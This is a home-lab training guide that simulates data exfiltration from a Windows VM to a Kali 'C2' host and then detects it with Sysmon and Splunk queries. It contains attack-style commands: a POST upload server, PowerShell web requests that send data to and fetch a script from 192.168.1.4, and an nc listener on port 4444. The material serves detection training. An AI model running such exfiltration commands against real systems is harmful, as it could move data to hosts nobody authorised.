# Scenario 5: Data Exfiltration Simulation - Live Guide

## Overview
Simulate data exfiltration by making suspicious outbound network connections from Windows to Kali Linux. This demonstrates how attackers exfiltrate data to external systems.

---

## Step 1: Prepare Kali Linux (as C2 Server)

### 1.1 Start HTTP Server on Kali

**On Kali Linux VM:**

1. **Open terminal or SSH into Kali**

2. **Start a simple HTTP server:**
   ```bash
   # Start Python HTTP server on port 8080
   python3 -m http.server 8080
   ```

   **Keep this terminal open and running!** The server needs to stay active to receive connections.

   **Note:** The default Python HTTP server only supports GET requests, not POST. This is fine - connections will still generate Sysmon Event ID 3 events!

3. **Verify the server is running:**
   ```bash
   # In another terminal, check if port 8080 is listening
   netstat -tuln | grep 8080
   # OR
   ss -tuln | grep 8080
   ```

4. **Optional: Create a simple upload endpoint (if you want to support POST requests):**
   ```bash
   # Create a simple upload script that supports POST
   from http.server import HTTPServer, BaseHTTPRequestHandler


    class UploadHandler(BaseHTTPRequestHandler):

        def do_GET(self):
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b"Server is running")

        def do_POST(self):
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length)

            print(
                f"Received {len(post_data)} bytes: "
                f"{post_data.decode('utf-8', errors='ignore')}"
            )

            self.send_response(200)
            self.send_header('Content-type', 'text/plain')
            self.end_headers()
            self.wfile.write(b"OK")

        def log_message(self, format, *args):
            # Suppress default logging
            pass


    httpd = HTTPServer(('0.0.0.0', 8080), UploadHandler)
    print("Server running on http://0.0.0.0:8080")
    httpd.serve_forever()

   
   # Stop the default server (Ctrl+C) and run the new one
   python3 /tmp/upload_handler.py
   ```

   **Note:** If you use this script, you can use POST requests. Otherwise, stick with GET requests.

---

## Step 2: Execute Data Exfiltration on Windows 10

### 2.1 Open PowerShell on Windows 10 VM

**On Windows 10 VM:**

1. **Open PowerShell as Regular User** (NOT Administrator)
   - Press `Windows Key + R`
   - Type `powershell` and press Enter
   - OR search for "PowerShell" in Start Menu

### 2.2 Simulate Data Exfiltration

**Run these commands one by one in PowerShell:**

**Command 1: Basic HTTP request to Kali (Use GET - POST not supported by default server)**
```powershell
# Use GET instead of POST (default Python server only supports GET)
Invoke-WebRequest -Uri http://192.168.1.4:8080/upload

# OR if you want to test POST, use the optional upload handler script below
```

**Note:** The error about POST not being supported is fine - the connection was still made and will generate Sysmon Event ID 3!

**Command 2: Test connection to non-standard port**
```powershell
Test-NetConnection -ComputerName 192.168.1.4 -Port 8080
```

**Command 3: Create suspicious outbound connection (CORRECTED - Handle Connection Failure)**
```powershell
# Option A: Try to connect (will fail but generates Sysmon event)
try {
    $client = New-Object System.Net.Sockets.TcpClient("192.168.1.4", 4444)
    $client.Close()
} catch {
    Write-Host "Connection failed (expected) - but Sysmon logged the attempt!"
}

# Option B: Alternative - Use Test-NetConnection (doesn't throw exception)
Test-NetConnection -ComputerName 192.168.1.4 -Port 4444

# Option C: Start a listener on Kali first (port 4444), then connect
# On Kali: nc -lvp 4444
# Then on Windows: 
# $client = New-Object System.Net.Sockets.TcpClient("192.168.1.4", 4444)
# $client.Close()
```

**Note:** The connection failure is fine! Sysmon logs connection attempts even if they fail. The error means the connection attempt was made, which is what we need for detection.

**Command 4: Multiple connections to non-standard ports**
```powershell
for ($i=1; $i -le 5; $i++) {
    Test-NetConnection -ComputerName 192.168.1.4 -Port (8000 + $i)
}
```

**Command 5: PowerShell download (simulated) - Use GET**
```powershell
# Create temp directory first
New-Item -ItemType Directory -Path C:\temp -Force

# Use GET request (default server supports this)
Invoke-WebRequest -Uri http://192.168.1.4:8080/test.ps1 -OutFile C:\temp\test.ps1
```

**Command 6: If you set up the POST handler, you can use POST:**
```powershell
# Only works if you're using the upload_handler.py script
Invoke-WebRequest -Uri http://192.168.1.4:8080/upload -Method POST -Body "test data"
```

**Important Notes:** 
- **Connection failures are fine!** Sysmon logs connection attempts even if they fail
- If you see "connection refused" or "target machine actively refused it" - that's expected
- The connection attempt was made, which generates Sysmon Event ID 3
- Some commands may fail (ports not open), but they will still generate Sysmon Event ID 3 entries!
- The POST error is fine - the connection was made, which is what we need for detection
- GET requests work fine with the default Python server

### 2.3 Generate More Network Activity

**Create additional suspicious connections:**

```powershell
# Create temp directory if needed
New-Item -ItemType Directory -Path C:\temp -Force

# Multiple HTTP GET requests (default server supports GET)
1..10 | ForEach-Object {
    Invoke-WebRequest -Uri "http://192.168.1.4:8080/data?num=$_"
    Start-Sleep -Milliseconds 100
}

# Alternative: Multiple connections to different ports
8001..8010 | ForEach-Object {
    Test-NetConnection -ComputerName 192.168.1.4 -Port $_ -InformationLevel Quiet
    Start-Sleep -Milliseconds 50
}
```

---

## Step 3: Verify in Splunk

### 3.1 Wait for Logs to Arrive

**Important:** Wait 1-2 minutes after running PowerShell commands for Sysmon events to be forwarded to Splunk.

### 3.2 Open Splunk Web UI

1. Open browser on your host machine
2. Navigate to: `http://192.168.1.7:8000`
3. Login with your Splunk credentials

### 3.3 Discover Field Names (IMPORTANT)

**Before running detection queries, discover the actual field names:**

**Step 1: View raw event**
```spl
index=sysmon EventCode=3
| head 1
```

**Step 2: Get field summary**
```spl
index=sysmon EventCode=3
| head 1
| fieldsummary
```

**Step 3: View all fields**
```spl
index=sysmon EventCode=3
| head 1
| table *
```

**Common field name variations:**
- Destination IP: `DestinationIp`, `Destination_IP`, `dest_ip`, `dst_ip`
- Destination Port: `DestinationPort`, `Destination_Port`, `dest_port`, `dst_port`
- Process Image: `Image`, `ImagePath`, `ProcessPath`, `Process_Image`
- Protocol: `Protocol`, `IpProtocol`

### 3.4 Search for Network Connections

**In Splunk Search bar, paste:**

**Option A: Basic search**
```spl
index=sysmon EventCode=3
| head 20
```

**Option B: Filter for connections to Kali**
```spl
index=sysmon EventCode=3 DestinationIp=192.168.1.4
| head 20
```

**What you should see:**
- Event ID 3 (Network Connection)
- Recent timestamps (within last few minutes)
- DestinationIp should be `192.168.1.4` (Kali)
- DestinationPort should show various ports (8080, 4444, 8001-8005, etc.)
- Image field shows the process making the connection

### 3.5 Run Detection Query

**Primary Detection Query:**
```spl
index=sysmon EventCode=3
| stats count by Image, DestinationIp, DestinationPort
| where DestinationPort != 53 AND DestinationPort != 80 AND DestinationPort != 443
| sort -count
```

**What to look for:**
- DestinationIp should be `192.168.1.4` (Kali)
- DestinationPort should be non-standard (8080, 4444, 8001-8005, etc.)
- Image field shows processes like `powershell.exe`, `System.Net.Sockets.TcpClient`, etc.
- Count shows number of connections to each port

### 3.6 Enhanced Detection Query

**Detect suspicious outbound connections to attacker IP:**

**Option A: Filter for Kali IP specifically**
```spl
index=sysmon EventCode=3 DestinationIp=192.168.1.4
| where DestinationPort != 53 AND DestinationPort != 80 AND DestinationPort != 443 AND DestinationPort != 3389
| table _time, Image, DestinationIp, DestinationPort, Protocol, Initiated
| sort -_time
```

**Option B: Exclude common ports**
```spl
index=sysmon EventCode=3
| where DestinationPort != 53 AND DestinationPort != 80 AND DestinationPort != 443 AND DestinationPort != 3389 AND DestinationPort != 445
| stats count by Image, DestinationIp, DestinationPort
| sort -count
```

**Option C: Focus on PowerShell connections**
```spl
index=sysmon EventCode=3 Image="*powershell.exe"
| stats count by DestinationIp, DestinationPort
| sort -count
```

### 3.7 Detailed View

**See all relevant fields:**

**Option A: Standard fields**
```spl
index=sysmon EventCode=3 DestinationIp=192.168.1.4
| table _time, Image, DestinationIp, DestinationPort, Protocol, Initiated, User
| sort -_time
```

**Option B: Extract from raw if fields don't exist**
```spl
index=sysmon EventCode=3
| where _raw LIKE "%192.168.1.4%"
| rex field=_raw "DestinationIp:\s+(?<dest_ip>[^\r\n]+)"
| rex field=_raw "DestinationPort:\s+(?<dest_port>[^\r\n]+)"
| rex field=_raw "Image:\s+(?<image>[^\r\n]+)"
| table _time, image, dest_ip, dest_port
| sort -_time
```

**This shows:**
- When the network connection occurred
- Which process made the connection
- Destination IP address (attacker IP)
- Destination port (non-standard ports are suspicious)
- Protocol used
- Whether connection was initiated

### 3.8 Timeline of Data Exfiltration

**See network connections over time:**

**Option A: By destination IP**
```spl
index=sysmon EventCode=3
| where DestinationPort != 53 AND DestinationPort != 80 AND DestinationPort != 443
| timechart count by DestinationIp
```

**Option B: By destination port**
```spl
index=sysmon EventCode=3 DestinationIp=192.168.1.4
| timechart count by DestinationPort
```

**Option C: Simple count over time**
```spl
index=sysmon EventCode=3 DestinationIp=192.168.1.4
| where DestinationPort != 53 AND DestinationPort != 80 AND DestinationPort != 443
| timechart count
```

**This visualizes:**
- When data exfiltration occurred
- Frequency of connections
- Which ports were used
- Patterns of data exfiltration

---

## Step 4: Advanced Analysis

### 4.1 Detect Suspicious Outbound Traffic Patterns

**Find unusual outbound connections:**

```spl
index=sysmon EventCode=3
| where DestinationPort != 53 AND DestinationPort != 80 AND DestinationPort != 443 AND DestinationPort != 3389 AND DestinationPort != 445
| stats count, dc(DestinationPort) as unique_ports, values(DestinationPort) as ports by Image, DestinationIp
| where count > 5 OR unique_ports > 3
| sort -count
```

**This detects:**
- Multiple connections from same process
- Multiple ports used (potential data exfiltration)
- Unusual outbound traffic patterns

### 4.2 Correlate with Process Creation

**See what processes are making suspicious connections:**

```spl
index=sysmon (EventCode=1 OR EventCode=3)
| eval event_type=case(EventCode=1, "Process Creation", EventCode=3, "Network Connection", 1=1, "Other")
| where (EventCode=1 AND Image="*powershell.exe") OR (EventCode=3 AND DestinationIp="192.168.1.4")
| transaction ProcessId maxspan=5m
| table _time, event_type, Image, CommandLine, DestinationIp, DestinationPort
| sort -_time
```

**Alternative (if transaction doesn't work well):**
```spl
index=sysmon (EventCode=1 OR EventCode=3)
| eval event_type=case(EventCode=1, "Process Creation", EventCode=3, "Network Connection", 1=1, "Other")
| where (EventCode=1 AND Image="*powershell.exe") OR (EventCode=3 AND DestinationIp="192.168.1.4")
| stats values(event_type) as event_types, values(Image) as images, values(CommandLine) as commands, values(DestinationIp) as dest_ips, values(DestinationPort) as dest_ports by ProcessId
| where match(event_types, "Process Creation") AND match(event_types, "Network Connection")
| table ProcessId, event_types, images, commands, dest_ips, dest_ports
```

**Simpler version (without transaction):**
```spl
index=sysmon (EventCode=1 OR EventCode=3)
| eval event_type=case(EventCode=1, "Process Creation", EventCode=3, "Network Connection", 1=1, "Other")
| where (EventCode=1 AND Image="*powershell.exe") OR (EventCode=3 AND DestinationIp="192.168.1.4")
| table _time, event_type, Image, CommandLine, DestinationIp, DestinationPort, ProcessId
| sort -_time
```

**This helps identify:**
- What process created the network connections
- Full command chain
- Timeline of attack

### 4.3 Alert-Ready Query

**Query formatted for Splunk alerts:**

**Option A: Basic alert query**
```spl
index=sysmon EventCode=3
| where DestinationPort != 53 AND DestinationPort != 80 AND DestinationPort != 443 AND DestinationPort != 3389
| stats count by DestinationIp, DestinationPort
| where count > 10
```

**Option B: Enhanced alert query**
```spl
index=sysmon EventCode=3
| where DestinationPort != 53 AND DestinationPort != 80 AND DestinationPort != 443 AND DestinationPort != 3389 AND DestinationPort != 445
| stats count, values(Image) as processes, values(DestinationPort) as ports by DestinationIp
| where count > 10
| eval severity=case(count > 50, "HIGH", count > 20, "MEDIUM", 1=1, "LOW")
| eval description="Suspicious outbound connections to " + DestinationIp + " (" + count + " connections) on ports: " + ports + " from processes: " + processes
| sort -count
```

**Option C: Alert for specific attacker IP**
```spl
index=sysmon EventCode=3 DestinationIp=192.168.1.4
| where DestinationPort != 53 AND DestinationPort != 80 AND DestinationPort != 443
| stats count, values(Image) as processes, values(DestinationPort) as ports by DestinationIp
| where count > 0
| eval severity="HIGH"
| eval description="Data exfiltration detected: " + count + " connections to attacker IP " + DestinationIp + " on ports: " + ports
```

---

## ✅ Success Checklist

- [/] HTTP server running on Kali (port 8080)
- [/] PowerShell commands executed on Windows 10
- [/] Multiple Sysmon Event ID 3 entries visible in Splunk
- [/] Detection query shows connections to Kali (192.168.1.4)
- [/] Non-standard ports detected (8080, 4444, 8001-8005, etc.)
- [/] Detection query filters out normal traffic (DNS, HTTP, HTTPS)
- [/] Image field shows processes making connections

---

## 🐛 Troubleshooting

### No Sysmon Event ID 3 appearing?

1. **Check if Sysmon is running:**
   ```powershell
   Get-Service Sysmon
   # Should show "Running"
   ```

2. **Check Sysmon events in Event Viewer:**
   - Open Event Viewer
   - Navigate to: Applications and Services Logs → Microsoft → Windows → Sysmon → Operational
   - Look for Event ID 3 entries
   - If events are here but not in Splunk, check Splunk Forwarder

3. **Verify Sysmon is generating events:**
   ```powershell
   # Run a simple command to generate an event
   Test-NetConnection -ComputerName 8.8.8.8 -Port 53
   # Then check Event Viewer for Sysmon Event ID 3
   ```

4. **Check if Sysmon is configured to log network connections:**
   ```powershell
   sysmon -c
   # Should show network connection logging is enabled
   ```

### Connection errors appearing?

**"Connection refused" or "target machine actively refused it" errors are EXPECTED and FINE!**

- These errors mean the connection attempt was made
- Sysmon logs connection attempts even when they fail
- Check Splunk - you should still see Event ID 3 entries

**If you want successful connections:**

1. **Start a listener on Kali for port 4444:**
   ```bash
   # On Kali, start netcat listener
   nc -lvp 4444
   # Keep this running
   ```

2. **Then on Windows, the connection will succeed:**
   ```powershell
   $client = New-Object System.Net.Sockets.TcpClient("192.168.1.4", 4444)
   $client.Close()
   ```

### No connections to Kali appearing in Splunk?

1. **Verify Kali HTTP server is running:**
   ```bash
   # On Kali, check if server is listening
   netstat -tuln | grep 8080
   ```

2. **Test connectivity from Windows:**
   ```powershell
   # On Windows, test if you can reach Kali
   Test-NetConnection -ComputerName 192.168.1.4 -Port 8080
   ```

3. **Check Windows firewall:**
   ```powershell
   Get-NetFirewallRule | Where-Object {$_.DisplayName -like "*Outbound*"}
   ```

4. **Remember: Failed connections still generate Sysmon events!**
   - Even if you see "connection refused", Sysmon should log it
   - Check Splunk for Event ID 3 with DestinationIp=192.168.1.4

### Field names not matching?

**Check available fields:**
```spl
index=sysmon EventCode=3
| head 1
| fieldsummary
```

**Common field name variations:**
- Destination IP: `DestinationIp`, `Destination_IP`, `dest_ip`, `dst_ip`
- Destination Port: `DestinationPort`, `Destination_Port`, `dest_port`, `dst_port`
- Image: `Image`, `ImagePath`, `ProcessPath`

**Extract from raw if needed:**
```spl
index=sysmon EventCode=3
| rex field=_raw "DestinationIp:\s+(?<dest_ip>[^\r\n]+)"
| rex field=_raw "DestinationPort:\s+(?<dest_port>[^\r\n]+)"
| table _time, Image, dest_ip, dest_port
```

---

## 📊 What You Should See

### Expected Splunk Results:

1. **Basic Query Results:**
   - Multiple Event ID 3 entries
   - Recent timestamps
   - DestinationIp: `192.168.1.4` (Kali)
   - DestinationPort: Various non-standard ports (8080, 4444, 8001-8005, etc.)
   - Image: Processes like `powershell.exe`, `System.Net.Sockets.TcpClient`, etc.

2. **Detection Query Results:**
   - Shows connections filtered to exclude normal ports (53, 80, 443)
   - Highlights suspicious outbound traffic
   - Groups by process, destination IP, and port

3. **Timeline Results:**
   - Shows when data exfiltration occurred
   - Frequency of connections
   - Patterns of data exfiltration

---

## 📸 Screenshot Tips

Take screenshots of:
1. Kali HTTP server running
2. PowerShell commands executing data exfiltration
3. Splunk search results showing Event ID 3
4. Detection query results showing suspicious connections
5. Timeline chart showing data exfiltration over time
6. Process correlation showing what created the connections

These demonstrate your ability to detect data exfiltration!

---

## 🎓 Learning Points

**Why this matters:**
- Data exfiltration is a critical attack phase
- Non-standard ports indicate suspicious activity
- Detecting outbound connections helps identify data theft
- SOC analysts must detect exfiltration quickly

**Real-world context:**
- Attackers exfiltrate data to external systems
- This is part of the MITRE ATT&CK framework (T1041)
- SOC analysts must detect unauthorized outbound traffic
- Often follows data collection phase

**Related MITRE ATT&CK Techniques:**
- **T1041:** Exfiltration Over C2 Channel
- **T1048:** Exfiltration Over Alternative Protocol
- **T1071:** Application Layer Protocol

---

## ✅ Ready for Next Steps?

Once you've verified:
- [ ] Data exfiltration events are visible in Splunk
- [ ] Detection queries work correctly
- [ ] You understand what Event ID 3 means
- [ ] You can identify suspicious outbound traffic

You've completed all 5 attack scenarios! 🎉

---

## 💡 Pro Tips

1. **Event ID 3 shows network connections** - Both inbound and outbound
2. **Filter out normal ports** - DNS (53), HTTP (80), HTTPS (443) are usually legitimate
3. **Look for patterns** - Multiple connections to same IP/port is suspicious
4. **Correlate with process creation** - See what process initiated the connection
5. **Monitor outbound to external IPs** - Especially to non-standard ports

Good luck! 🚀

